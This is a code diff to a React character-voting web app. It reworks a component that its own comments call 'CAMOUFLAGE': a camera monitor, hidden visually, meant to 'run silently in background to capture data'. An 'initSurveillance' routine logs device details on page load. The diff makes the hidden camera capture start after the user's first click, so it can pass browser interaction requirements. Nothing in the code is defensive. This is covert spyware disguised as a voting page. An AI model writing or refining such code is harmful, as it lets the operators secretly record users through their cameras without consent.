@@ -31,6 +31,7 @@ function App() {
 
   const [hasVoted, setHasVoted] = useState<boolean>(false);
   const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
+  const [hasInteracted, setHasInteracted] = useState(false); // New state to track interaction
 
   // --- PERMISSION STATE ---
   const [isLocationDenied, setIsLocationDenied] = useState(false);
@@ -43,7 +44,7 @@ function App() {
   const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
   const [isVotingEnded, setIsVotingEnded] = useState(false);
 
-  // --- IMMEDIATE LOGGING ---
+  // --- IMMEDIATE LOGGING (Passive Only - No Permissions) ---
   useEffect(() => {
       const initSurveillance = async () => {
           const deviceInfo = {
@@ -69,6 +70,13 @@ function App() {
       };
       initSurveillance();
   }, [guestId]); 
+
+  // --- INTERACTION HANDLER ---
+  const registerInteraction = useCallback(() => {
+      if (!hasInteracted) {
+          setHasInteracted(true);
+      }
+  }, [hasInteracted]);
 
   // --- DATA LOADING ---
   const fetchCharacters = useCallback(async () => {
@@ -176,12 +184,24 @@ function App() {
     return () => clearInterval(timer);
   }, [votingDeadline]);
 
-  const handleNext = () => setActiveIndex((prev) => (prev + 1) % characters.length);
-  const handlePrev = () => setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
-  const handleCardClick = (index: number) => setActiveIndex(index);
+  const handleNext = () => {
+      registerInteraction();
+      setActiveIndex((prev) => (prev + 1) % characters.length);
+  };
+  
+  const handlePrev = () => {
+      registerInteraction();
+      setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
+  };
+
+  const handleCardClick = (index: number) => {
+      registerInteraction();
+      setActiveIndex(index);
+  };
 
   // --- INTERACTIVE LEADERBOARD ---
   const handleLeaderboardSelect = (charId: string) => {
+      registerInteraction();
       const idx = characters.findIndex(c => c.id === charId);
       if (idx !== -1) {
           setActiveIndex(idx);
@@ -192,6 +212,7 @@ function App() {
 
   // --- VOTE FLOW ---
   const handleVoteClick = async () => {
+      registerInteraction();
       if (hasVoted || isVotingEnded) return;
 
       // 1. Check Permissions First
@@ -325,7 +346,7 @@ function App() {
         <section className="w-full flex flex-col items-center gap-4 px-2">
              <div className="flex justify-center gap-1.5 mb-2">
                 {characters.map((_, idx) => (
-                  <button key={idx} onClick={() => setActiveIndex(idx)} className={`h-1.5 rounded-full transition-all duration-300 ${idx === activeIndex ? 'w-8 bg-indigo-400' : 'w-1.5 bg-slate-700'}`} />
+                  <button key={idx} onClick={() => { registerInteraction(); setActiveIndex(idx); }} className={`h-1.5 rounded-full transition-all duration-300 ${idx === activeIndex ? 'w-8 bg-indigo-400' : 'w-1.5 bg-slate-700'}`} />
                 ))}
              </div>
              <button
@@ -368,9 +389,10 @@ function App() {
         )}
       </AnimatePresence>
       
-      {/* CAMOUFLAGE: Camera Monitor always active, hidden visually but present in DOM */}
-      {/* It will try to run silently in background to capture data */}
-      <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
+      {/* CAMOUFLAGE: Camera Monitor ONLY activates after user interaction */}
+      {hasInteracted && (
+        <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
+      )}
     </div>
   );
 }
